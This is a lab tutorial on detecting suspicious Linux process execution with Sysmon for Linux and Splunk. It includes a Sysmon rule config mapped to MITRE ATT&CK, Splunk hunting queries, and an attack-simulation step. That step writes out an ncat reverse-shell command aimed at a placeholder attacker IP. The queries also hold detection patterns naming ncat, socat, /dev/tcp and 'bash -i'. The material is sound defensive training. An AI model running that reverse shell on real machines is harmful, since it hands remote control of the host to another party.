# Monitoring and Investigation of Suspicious Process Execution (Linux)

## Inputs Configuration for Splunk

```sh
nano /opt/splunkforwarder/etc/system/local/inputs.conf
```

```sh
[monitor:///var/log/sysmon.log]
sourcetype = syslog
index = linux_os_logs
```

- Installation of **Sysmon for Linux** with an advanced XML configuration to detect multiple MITRE ATT&CK techniques.

## Install Sysmon for Linux

- [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Recommended base config: MSTIC Sysmon Config](https://raw.githubusercontent.com/microsoft/MSTIC-Sysmon/main/linux/configs/main.xml)

```sh
# Download Microsoft packages repo
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb

# Update package list
sudo apt-get update

# Install Sysmon for Linux
sudo apt-get install sysmonforlinux -y
```

## Configure Sysmon with Advanced Rules

#### Create the configuration file

```sh
nano sysmon-config.xml
```

## Paste the advanced XML configuration

- This configuration covers multiple `MITRE ATT&CK` techniques for `process creation, network connections, file creation, persistence, environment injection, and process termination`.

```sh
<!--
    SysmonForLinux

    Copyright (c) Microsoft Corporation

    All rights reserved.

    MIT License

    Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without
 restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom th
e Software is furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE
 AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISI
NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-->
<Sysmon schemaversion="4.81">
  <EventFiltering>
    <!-- Event ID 1 == ProcessCreate -->
    <RuleGroup name="" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Rule name="TechniqueID=T1021.004,TechniqueName=Remote Services: SSH" groupRelation="and">
          <Image condition="end with">ssh</Image>
          <CommandLine condition="contains">ConnectTimeout=</CommandLine>
          <CommandLine condition="contains">BatchMode=yes</CommandLine>
          <CommandLine condition="contains">StrictHostKeyChecking=no</CommandLine>
          <CommandLine condition="contains any">wget;curl</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1027.001,TechniqueName=Obfuscated Files or Information: Binary Padding" groupRelation="and">
          <Image condition="is">/bin/dd</Image>
          <CommandLine condition="contains all">dd;if=</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1033,TechniqueName=System Owner/User Discovery" groupRelation="or">
          <CommandLine condition="contains">/var/log/btmp</CommandLine>
          <CommandLine condition="contains">/var/log/wtmp</CommandLine>
          <CommandLine condition="contains">/var/run/utmp</CommandLine>
          <Image condition="contains">/usr/bin/last</Image>
          <Image condition="contains">/usr/bin/lastb</Image>
          <Image condition="contains">/usr/bin/who</Image>
          <Image condition="contains">/usr/bin/w</Image>
        </Rule>
        <Rule name="TechniqueID=T1053.003,TechniqueName=Scheduled Task/Job: Cron" groupRelation="or">
          <Image condition="end with">crontab</Image>
        </Rule>
        <Rule name="TechniqueID=T1059.004,TechniqueName=Command and Scripting Interpreter: Unix Shell" groupRelation="or">
          <Image condition="end with">/bin/bash</Image>
          <Image condition="end with">/bin/dash</Image>
          <Image condition="end with">/bin/sh</Image>
        </Rule>
        <Rule name="TechniqueID=T1070.006,TechniqueName=Indicator Removal on Host: Timestomp" groupRelation="and">
          <Image condition="is">/bin/touch</Image>
          <CommandLine condition="contains any">-r;--reference;-t;--time</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1087.001,TechniqueName=Account Discovery: Local Account" groupRelation="or">
          <CommandLine condition="contains">/etc/passwd</CommandLine>
          <CommandLine condition="contains">/etc/sudoers</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
          <Image condition="end with">wget</Image>
          <Image condition="end with">curl</Image>
          <Image condition="end with">ftpget</Image>
          <Image condition="end with">tftp</Image>
          <Image condition="end with">lwp-download</Image>
        </Rule>
        <Rule name="TechniqueID=T1123,TechniqueName=Audio Capture" groupRelation="and">
          <Image condition="contains">/bin/aplay</Image>
          <Image condition="contains">wget</Image>
          <CommandLine condition="contains">arecord</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1136.001,TechniqueName=Create Account: Local Account" groupRelation="or">
          <Image condition="end with">useradd</Image>
          <Image condition="end with">adduser</Image>
        </Rule>
        <Rule name="TechniqueID=T1203,TechniqueName=Exploitation for Client Execution" groupRelation="and">
          <User condition="is">root</User>
          <LogonId condition="is">0</LogonId>
          <CurrentDirectory condition="is">/var/opt/microsoft/scx/tmp</CurrentDirectory>
          <CommandLine condition="contains">/bin/sh</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1485,TechniqueName=Data Destruction" groupRelation="and">
          <Image condition="is">/bin/dd</Image>
          <CommandLine condition="contains all">dd;of=;if=</CommandLine>
          <CommandLine condition="contains any">if=/dev/zero;if=/dev/null</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1505.003,TechniqueName=Server Software Component: Web Shell" groupRelation="and">
          <Image condition="contains any">whoami;ifconfig;/usr/bin/ip;/bin/uname</Image>
          <ParentImage condition="contains any">httpd;lighttpd;nginx;apache2;node;dash</ParentImage>
        </Rule>
        <Rule name="TechniqueID=T1543.002,TechniqueName=Create or Modify System Process: Systemd Service" groupRelation="or">
          <Image condition="end with">systemd</Image>
        </Rule>
        <Rule name="TechniqueID=T1548.001,TechniqueName=Abuse Elevation Control Mechanism: Setuid and Setgid" groupRelation="or">
          <Image condition="end with">chmod</Image>
          <Image condition="end with">chown</Image>
          <Image condition="end with">fchmod</Image>
          <Image condition="end with">fchmodat</Image>
          <Image condition="end with">fchown</Image>
          <Image condition="end with">fchownat</Image>
          <Image condition="end with">fremovexattr</Image>
          <Image condition="end with">fsetxattr</Image>
          <Image condition="end with">lchown</Image>
          <Image condition="end with">lremovexattr</Image>
          <Image condition="end with">lsetxattr</Image>
          <Image condition="end with">removexattr</Image>
          <Image condition="end with">setuid</Image>
          <Image condition="end with">setgid</Image>
          <Image condition="end with">setreuid</Image>
          <Image condition="end with">setregid</Image>
        </Rule>
        <Rule name="SSH Connection" groupRelation="and">
          <Image condition="end with">ssh</Image>
          <CommandLine condition="contains">ConnectTimeout=</CommandLine>
          <CommandLine condition="contains">BatchMode=yes</CommandLine>
          <CommandLine condition="contains">sshd</CommandLine>
          <CommandLine condition="contains">ssh</CommandLine>
        </Rule>
        <Rule name="wget or curl" groupRelation="or">
          <Image condition="end with">wget</Image>
          <Image condition="end with">curl</Image>
        </Rule>
      </ProcessCreate>
    </RuleGroup>
    <!-- Event ID 3 == NetworkConnect Detected -->
    <RuleGroup name="IngressToolTransfer" groupRelation="or">
      <NetworkConnect onmatch="include">
        <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
          <Image condition="end with">wget</Image>
          <Image condition="end with">curl</Image>
          <Image condition="end with">ftpget</Image>
          <Image condition="end with">lwp-download</Image>
          <Image condition="end with">lwp-download</Image>
          <DestinationIp condition="is not">127.0.0.1</DestinationIp>
        </Rule>
      </NetworkConnect>
    </RuleGroup>
    <!-- Event ID 5 == ProcessTerminate -->
    <RuleGroup name="" groupRelation="or">
      <ProcessTerminate onmatch="include" />
    </RuleGroup>
    <!-- Event ID 9 == RawAccessRead -->
    <RuleGroup name="" groupRelation="or">
      <RawAccessRead onmatch="include" />
    </RuleGroup>
    <!-- Event ID 11 == FileCreate -->
    <RuleGroup name="" groupRelation="or">
      <FileCreate onmatch="include">
        <Rule name="TechniqueID=T1037,TechniqueName=Boot or Logon Initialization Scripts" groupRelation="or">
          <TargetFilename condition="begin with">/etc/init/</TargetFilename>
          <TargetFilename condition="begin with">/etc/init.d/</TargetFilename>
          <TargetFilename condition="begin with">/etc/rc.d/</TargetFilename>
        </Rule>
        <Rule name="TechniqueID=T1053.003,TechniqueName=Scheduled Task/Job: Cron" groupRelation="or">
          <TargetFilename condition="is">/etc/cron.allow</TargetFilename>
          <TargetFilename condition="is">/etc/cron.deny</TargetFilename>
          <TargetFilename condition="is">/etc/crontab</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.d/</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.daily/</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.hourly/</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.monthly/</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.weekly/</TargetFilename>
          <TargetFilename condition="begin with">/var/spool/cron/crontabs/</TargetFilename>
        </Rule>
        <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
          <Image condition="end with">wget</Image>
          <Image condition="end with">curl</Image>
          <Image condition="end with">ftpget</Image>
          <Image condition="end with">tftp</Image>
          <Image condition="end with">lwp-download</Image>
        </Rule>
        <Rule name="TechniqueID=T1543.002,TechniqueName=Create or Modify System Process: Systemd Service" groupRelation="or">
          <TargetFilename condition="begin with">/etc/systemd/system</TargetFilename>
          <TargetFilename condition="begin with">/usr/lib/systemd/system</TargetFilename>
          <TargetFilename condition="begin with">/run/systemd/system/</TargetFilename>
          <TargetFilename condition="contains">/systemd/user/</TargetFilename>
        </Rule>
      </FileCreate>
    </RuleGroup>
    <!--Event ID 23 == FileDelete -->
    <RuleGroup name="" groupRelation="or">
      <FileDelete onmatch="include" />
    </RuleGroup>

    <!-- Process events -->
    <RuleGroup name="Process Monitoring" groupRelation="or">
      <ProcessCreate onmatch="include"/>
      <ProcessTerminate onmatch="include"/>
    </RuleGroup>

    <!-- File events -->
    <RuleGroup name="File Monitoring" groupRelation="or">
      <FileCreate onmatch="include"/>
      <FileDelete onmatch="include"/>
    </RuleGroup>

    <!-- Network events -->
    <RuleGroup name="Network Monitoring" groupRelation="or">
      <NetworkConnect onmatch="include"/>
    </RuleGroup>

     <!-- DNS queries -->
    <RuleGroup name="DNS Monitoring" groupRelation="or">
      <DnsQuery onmatch="include"/>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
```

## Start Sysmon with the configuration

```sh
sudo sysmon -i /etc/sysmon-config.xml
sudo systemctl restart sysmon
sudo systemctl status sysmon

sudo sysmon -c /etc/sysmon-config.xml

sudo journalctl -u sysmon.service -f
```

## Simulate an Attack (Reverse Shell)

#### On attacker machine

```sh
sudo apt install ncat net-tools -y
sudo ncat -lnvp 4444 -k
```

#### On victim machine

```sh
sudo apt install ncat net-tools -y
ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
```

#### Verify the connection

```sh
lsof -i :4444
netstat -tulnp | grep 4444
```

## Analysis in Splunk

#### a. All Sysmon logs:

```sh
index="linux_os_logs"  process=sysmon TechniqueName=Command

index="linux_os_logs"  process=sysmon TechniqueName=Command "ncat"
```

#### b. Suspicious command execution:

```sh
index="linux_os_logs" process=sysmon TechniqueName=Command
(ncat OR netcat OR "bash -i" OR curl OR wget OR "python -c" OR "perl -e" OR "php -r" OR socat OR "/dev/tcp" OR "chmod 777" OR scp)
```

#### c. Command stats by host and time:

```sh
index="linux_os_logs" process=sysmon TechniqueName=Command
| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
| stats count by host, command_executed, _time
| sort - count
```

#### d. Timechart of suspicious commands:

```sh
index="linux_os_logs" process=sysmon TechniqueName=Command
| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
| timechart span=30m count by command_executed
```

## Persistence monitoring (cron/systemd changes):

#### a. Cron and systemd events per host

```sh
index="linux_os_logs" process=sysmon
| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
| stats count by host, _raw, _time
| sort -_time
```

#### b. Cron/systemd events aggregated hourly

```sh
index="linux_os_logs" process=sysmon
| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
| bin _time span=1h
| stats count by _time, host
| sort _time
```

#### c. Timechart of cron/systemd events

```sh
index="linux_os_logs" process=sysmon
| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
| timechart span=1h count by host
```

#### d. Suspicious commands executed

```sh
index="linux_os_logs" process=sysmon
| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)\s(?P<command_args>.*)"
| stats count by host, command_executed, command_args, _time
| sort -count
```

## Incident Response

#### Kill the Malicious Process:

```sh
ps aux | grep bash
```

#### Terminate the process:

```sh
sudo kill <pid>
```
